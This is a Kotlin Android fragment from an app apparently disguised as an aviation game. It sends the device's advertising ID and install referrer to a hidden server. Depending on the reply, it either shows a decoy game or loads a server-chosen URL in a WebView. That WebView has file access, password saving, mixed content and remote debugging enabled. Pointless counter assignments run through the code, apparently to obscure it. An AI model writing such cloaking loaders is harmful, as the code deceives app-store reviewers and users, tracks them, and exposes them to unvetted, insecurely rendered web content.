package com.light.avia.app

import android.content.Context
import android.content.Intent
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.Bundle
import android.view.KeyEvent
import androidx.fragment.app.Fragment
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import android.webkit.CookieManager
import android.webkit.WebResourceRequest
import android.webkit.WebSettings
import android.webkit.WebView
import android.webkit.WebViewClient
import android.widget.FrameLayout
import com.airbnb.lottie.LottieAnimationView
import com.android.installreferrer.api.InstallReferrerClient
import com.android.installreferrer.api.InstallReferrerStateListener
import com.android.volley.NetworkResponse
import com.android.volley.Response
import com.android.volley.toolbox.StringRequest
import com.android.volley.toolbox.Volley
import com.facebook.FacebookSdk
import com.google.android.gms.ads.identifier.AdvertisingIdClient
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.async
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import org.json.JSONObject
import kotlin.coroutines.Continuation
import kotlin.coroutines.resume
import kotlin.coroutines.suspendCoroutine

class AviaGoingLightFragment : Fragment() {
    private var aviaCoroutineLight: CoroutineScope = CoroutineScope(Dispatchers.IO)
    private var aviaContLight:String = "null"
    private lateinit var aviaRequeResLight:String
    private val aviaCookieManLight = CookieManager.getInstance()
    private var aviaCreaLight:Int = 2

    override fun onCreateView(
        inflater: LayoutInflater, container: ViewGroup?,
        savedInstanceState: Bundle?
    ): View? {
        aviaCreaLight =3
        return inflater.inflate(R.layout.fragment_avia_going_light, container, false)
    }

    override fun onViewCreated(view: View, savedInstanceState: Bundle?) {
        super.onViewCreated(view, savedInstanceState)

        aviaCreaLight = 4

        val lottieAnimationView:LottieAnimationView = view.findViewById(R.id.avia_lottie_light)

        lottieAnimationView.setOnClickListener {
            parentFragmentManager.beginTransaction().replace(R.id.avia_contai_light, AviaChoiceLightFragment()).commit()
        }

        val aviaPrefShLight = aviaGetSharedPLight()
        val checkInet = aviaCheckIntNetLight(requireActivity())

        if (aviaPrefShLight == null){
            if (!checkInet){
                aviaStartLight()
            }else{
                aviaStartNextLight(view)
            }
        }else{
            if (aviaPrefShLight==requireActivity().getString(R.string.avoa_404_light)){
                aviaStartLight()
            }else{
                if (!checkInet){
                    aviaStartLight()
                }else{
                    aviaStartToLight(aviaPrefShLight, view)
                }
            }
        }
    }

    private fun aviaStartNextLight(view: View){
        aviaCoroutineLight.launch {
            aviaCreaLight ++

            var aviaSuccessLight = false
            val aviaFbRLight = async { aviaInitializateLightF()}.await()
            val aviaMaxAttLight = 2
            if (aviaFbRLight!=requireActivity().getString(R.string.avia_error_light)){
                val aviaDRLight = async { aviaInitializateDLight()}.await()
                var aviaAttLight = 0

                try {
                    while (aviaAttLight < aviaMaxAttLight && !aviaSuccessLight){
                        if (aviaDRLight!=requireActivity().getString(R.string.avia_error_light) && aviaDRLight!="null" && aviaDRLight!=""){
                            aviaRequeResLight = async { aviaReqLight(aviaDRLight, aviaFbRLight)}.await()
                            aviaCreaLight ++
                            if(aviaRequeResLight==requireActivity().getString(R.string.avia_0_light)){
                                aviaAttLight++
                            }else{
                                aviaSuccessLight=true
                                aviaCreaLight =5
                            }
                        }else{
                            withContext(Dispatchers.Main){
                                aviaStartLight()
                                aviaCreaLight =2
                            }
                        }
                    }
                    delay(300)
                    if (aviaRequeResLight==requireActivity().getString(R.string.avia_200_light)){
                        if (aviaContLight!="null"){
                            aviaSetShPLight(aviaContLight)

                            withContext(Dispatchers.Main){
                                aviaStartToLight(aviaContLight, view)
                                aviaCreaLight =2
                            }
                        }else{
                            withContext(Dispatchers.Main){
                                aviaStartLight()
                                aviaCreaLight =2
                            }
                        }
                    }else{
                        aviaSetShPLight(requireActivity().getString(R.string.avoa_404_light))
                        withContext(Dispatchers.Main){
                            aviaStartLight()
                            aviaCreaLight =2
                        }
                    }
                }catch (aviaErLight:Throwable){
                    withContext(Dispatchers.Main){
                        aviaStartLight()
                        aviaCreaLight =2
                    }
                }
            }else{
                withContext(Dispatchers.Main){
                    aviaStartLight()
                    aviaCreaLight =2
                }
            }
        }
    }

    private suspend fun aviaInitializateDLight():String = suspendCoroutine{ aviaNextLight ->
        aviaCoroutineLight.launch {
            try {
                aviaNextLight.resume(AdvertisingIdClient.getAdvertisingIdInfo(requireActivity()).id!!)
            } catch (aviaErLight: Throwable) {
                aviaNextLight.resume(requireActivity().getString(R.string.avia_error_light))
            }
        }
    }

    private suspend fun aviaInitializateLightF(): String = suspendCoroutine { aviaNextLight ->
        aviaInitializateFacLight()
        initInRef(aviaNextLight)
    }

    private fun initInRef(aviaNextLight:Continuation<String>){
        val aviaRefClLight = InstallReferrerClient.newBuilder(requireActivity()).build()

        aviaRefClLight.startConnection(object :
            InstallReferrerStateListener {
            override fun onInstallReferrerSetupFinished(aviaRespCodeLight: Int) {
                aviaInsRefRespLight(aviaRespCodeLight, aviaNextLight, requireActivity(), aviaRefClLight)
            }

            override fun onInstallReferrerServiceDisconnected() {
                aviaNextLight.resume(requireActivity().getString(R.string.avia_error_light))
            }
        })
    }

    private fun aviaInitializateFacLight(){
        FacebookSdk.setAutoInitEnabled(true)
        FacebookSdk.fullyInitialize()
    }

    private fun aviaInsRefRespLight(aviaRespCodeLight: Int, aviaNextLight: Continuation<String>, aviaContextLight: Context, aviaRefClLight:InstallReferrerClient) {
        when (aviaRespCodeLight) {
            InstallReferrerClient.InstallReferrerResponse.SERVICE_UNAVAILABLE -> {
                aviaNextLight.resume(aviaContextLight.getString(R.string.avia_error_light))
            }
            InstallReferrerClient.InstallReferrerResponse.FEATURE_NOT_SUPPORTED,
            InstallReferrerClient.InstallReferrerResponse.OK -> {
                aviaNextLight.resume(aviaRefClLight.installReferrer.installReferrer.toString())
            }
        }
    }

    private suspend fun aviaReqLight(aviaGiaLight: String, aviaParmLight: String):String = suspendCoroutine { aviaNextLight ->
        val aviaUrLight = "https://${requireActivity().getString(R.string.avia_dom_rest_ball_horsassn_light)}"

        val queue = Volley.newRequestQueue(requireActivity())

        val jsonParams = JSONObject().apply {
            put("light_avia_pac", requireActivity().getString(R.string.avia_pac_n_light))
            put("light_avia_iagd", aviaGiaLight)
            put("light_avia_parmeeters", aviaParmLight)
        }
        val stringRequest = object: StringRequest(Method.POST, aviaUrLight,
            { response ->
                aviaContLight = response.toString()
            },
            { _ ->
                aviaNextLight.resume(requireActivity().getString(R.string.avia_0_light))
            }){

            override fun getBody(): ByteArray {
                return jsonParams.toString().toByteArray(Charsets.UTF_8)
            }

            override fun getHeaders(): MutableMap<String, String> {
                val headers = HashMap<String, String>()
                headers["Content-Type"] = "application/json"
                return headers
            }

            override fun parseNetworkResponse(response: NetworkResponse): Response<String> {
                val statusCode = response.statusCode

                aviaNextLight.resume(
                    when (statusCode) {
                        200 -> {
                            requireActivity().getString(R.string.avia_200_light)
                        }
                        404 -> {
                            requireActivity().getString(R.string.avoa_404_light)
                        }
                        else -> {
                            requireActivity().getString(R.string.avia_0_light)
                        }
                    }
                )
                return super.parseNetworkResponse(response)
            }

        }

        queue.add(stringRequest)
    }


    private fun aviaStartToLight(aviaULight:String, aviaVContLight:View){
        val aviaLight = WebView(requireActivity())

        aviaCreaLight =3

        aviaLight.webViewClient = object : WebViewClient() {
            override fun onPageCommitVisible(aviaVLight: WebView, aviaULight: String) {
                super.onPageCommitVisible(aviaVLight, aviaULight)
                aviaLight.visibility = View.VISIBLE
                aviaCreaLight =4
            }

            override fun shouldOverrideUrlLoading(
                aviaVLight: WebView?,
                aviaReqLight: WebResourceRequest?
            ): Boolean {
                if (!aviaReqLight.checkNullForAll() && !aviaReqLight?.url.checkNullForAll()) {
                    aviaCreaLight =5
                    val aviaUReqLight = aviaReqLight?.url.toString()
                    aviaCreaLight =6
                    if (aviaUReqLight.startsWith("https://") || aviaUReqLight.startsWith("http://")) {
                        aviaCreaLight =7
                        return false
                    } else {
                        val aviaIntentLight = Intent(Intent.ACTION_VIEW, aviaReqLight?.url)

                        aviaCreaLight =8
                        if (!aviaIntentLight.resolveActivity(requireActivity().packageManager).checkNullForAll()) {
                            aviaCreaLight =2
                            aviaVLight?.context?.startActivity(aviaIntentLight)
                            return true
                        }
                    }
                }
                return super.shouldOverrideUrlLoading(aviaVLight, aviaReqLight)
            }
        }

        aviaCookieManLight.setAcceptCookie(true)
        aviaCreaLight =5
        aviaCookieManLight.setAcceptThirdPartyCookies(aviaLight, true)
        aviaSetBackAndToolsLight(aviaLight)
        aviaCreaLight =7
        aviaLight.loadUrl(aviaULight)
        aviaCreaLight =8
        aviaAddToContLight(aviaVContLight, aviaLight)
    }

    private fun Any?.checkNullForAll(): Boolean {
        return this == null
    }

    private fun aviaSetBackAndToolsLight(aviaLight:WebView){
        aviaLight.setOnKeyListener { _, aviaKCLight, _ ->
            aviaCreaLight =9
            handleBackKeyEvent(aviaLight, aviaKCLight)
        }
        aviaToolsLight(aviaLight)
    }

    private fun aviaToolsLight(aviaNextLight: WebView) {
        aviaNextLight.apply {
            configureSettings()
            setLayerType(View.LAYER_TYPE_HARDWARE, null)
            requestFocus(View.FOCUS_DOWN)
        }
    }

    private fun WebView.configureSettings() {
        aviaCreaLight =91
        settings.apply {
            setSupportZoom(true)
            displayZoomControls = false
            cacheMode = WebSettings.LOAD_DEFAULT
            loadWithOverviewMode = true
            setRenderPriority(WebSettings.RenderPriority.HIGH)
            databaseEnabled = true
            javaScriptCanOpenWindowsAutomatically = true
            javaScriptEnabled = true
            useWideViewPort = true
            blockNetworkLoads = false
            setSupportMultipleWindows(false)
            builtInZoomControls = true
            allowContentAccess = true
            allowFileAccess = true
            saveFormData = true
            savePassword = true
            pluginState = WebSettings.PluginState.ON
            domStorageEnabled = true
            mediaPlaybackRequiresUserGesture = false
            mixedContentMode = WebSettings.MIXED_CONTENT_ALWAYS_ALLOW
            WebView.setWebContentsDebuggingEnabled(true)
        }
    }

    private fun aviaAddToContLight(aviaVContLight:View, aviaLight:WebView){
        aviaCreaLight =2
        val contAviaGameSearch: FrameLayout = aviaVContLight.findViewById(R.id.avia_cont_a_light)
        contAviaGameSearch.addView(aviaLight)
    }

    private fun handleBackKeyEvent(aviaConLight: WebView, aviaKCLight: Int): Boolean {
        aviaCreaLight =3
        if (aviaKCLight == KeyEvent.KEYCODE_BACK && aviaConLight.canGoBack()) {
            aviaCreaLight =2
            canGoBack(aviaConLight)
            return true
        }
        return false
    }

    private fun canGoBack(aviaConLight:WebView){
        aviaCreaLight =8
        aviaConLight.goBack()
        aviaConLight.scrollTo(0, 0)
    }

    private fun aviaCheckIntNetLight(aviaContextLight: Context): Boolean {
        aviaCreaLight =19
        val connectivityManager =
            aviaContextLight.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager

        val networkCapabilities = connectivityManager.activeNetwork ?: return false
        val activeNetwork =
            connectivityManager.getNetworkCapabilities(networkCapabilities) ?: return false

        return when {
            activeNetwork.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) -> true
            activeNetwork.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) -> true
            activeNetwork.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET) -> true
            else -> false
        }
    }

    private fun aviaStartLight(){
        aviaCreaLight =10
        parentFragmentManager.beginTransaction().replace(R.id.avia_contai_light, AviaChoiceLightFragment()).commit()
    }

    private fun aviaGetSharedPLight():String?{
        return requireActivity().getSharedPreferences("SavingAviaLight", Context.MODE_PRIVATE)?.getString("savingAviaLight", null)
    }

    private fun aviaSetShPLight(valueForSharedP:String){
        requireActivity().getSharedPreferences("SavingAviaLight", Context.MODE_PRIVATE)!!.edit().putString("savingAviaLight", valueForSharedP).apply()
    }

    override fun onDestroy() {
        super.onDestroy()
        aviaCreaLight =121
        aviaCoroutineLight.cancel()
    }

    override fun onStop() {
        super.onStop()
        aviaCreaLight =122
        aviaCookieManLight.flush()
    }
}